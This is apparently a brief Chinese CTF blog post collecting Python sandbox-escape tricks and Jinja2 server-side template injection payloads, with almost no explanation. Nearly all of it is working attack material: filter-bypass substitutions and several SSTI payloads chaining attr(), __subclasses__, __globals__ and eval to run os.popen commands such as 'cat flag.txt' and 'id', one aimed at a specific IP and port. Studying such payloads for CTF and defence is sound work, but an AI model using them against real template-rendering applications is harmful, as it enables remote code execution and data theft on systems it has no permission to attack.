---
title: python沙箱逃逸绕过以及exp收集
date: 2019-09-10 00:00:00
categories:
- CTF/Web
tags: python沙箱逃逸
---

留坑

```
os
sys
'
d
[
]

array[0]
array.pop(0)

__getitem__(1)

. 可替换为 getattr()
_ 可替换为 dir[0][0][0]


```


```python

http://152.136.210.141:21804/render?data={{request%7Cattr(request.args.get(%22a%22))%7Cattr(request.args.get(%22b%22))%7Cattr(request.args.get(%22c%22))%7Cattr(request.args.get(%22e%22))()%7Cattr(request.args.get(%22f%22))(476)%7Cattr(request.args.get(%22g%22))%7Cattr(request.args.get(%22h%22))%7Cattr(request.args.get(%22i%22))(request.args.get(%22j%22))%7Cattr(request.args.get(%22m%22))(request.args.get(%22n%22))(request.args.get(%22p%22))}}&a=__class__&b=__class__&c=__base__&e=__subclasses__&f=__getitem__&g=__init__&h=__globals__&i=__getitem__&j=__builtins__&m=__getitem__&n=eval&p=__import__(%22os%22).popen(%22cat%20flag.txt%22).read()


http://152.136.210.141:21804/render?data={{request|attr(request.args.get("a"))|attr(request.args.get("b"))|attr(request.args.get("c"))|attr(request.args.get("e"))()|attr(request.args.get("f"))(476)|attr(request.args.get("g"))|attr(request.args.get("h"))|attr(request.args.get("i"))(request.args.get("j"))|attr(request.args.get("m"))(request.args.get("n"))(request.args.get("p"))}}&a=__class__&b=__class__&c=__base__&e=__subclasses__&f=__getitem__&g=__init__&h=__globals__&i=__getitem__&j=__builtins__&m=__getitem__&n=eval&p=__import__("os").popen("cat flag.txt").read()


{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read



{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='ImmutableDictMixin' %}{{ c.__hash__.__globals__['__builtins__'].eval('__import__("os").popen("id").read()') }}{% endif %}{% endfor %}
```